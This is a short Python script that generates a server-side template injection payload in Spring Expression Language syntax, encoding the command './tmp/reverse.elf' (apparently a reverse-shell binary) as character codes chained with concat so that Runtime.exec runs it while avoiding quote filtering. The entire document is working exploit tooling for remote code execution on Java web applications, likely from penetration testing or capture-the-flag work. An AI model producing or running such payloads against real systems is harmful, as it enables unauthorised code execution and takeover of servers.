#!/usr/bin/python3

def main():

        command = "./tmp/reverse.elf" # specify command 
        convert = []

        for x in command:
            convert.append(str(ord(x)))
        
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % convert[0]

        for i in convert[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"

        print(payload)

if __name__ == "__main__":
    main()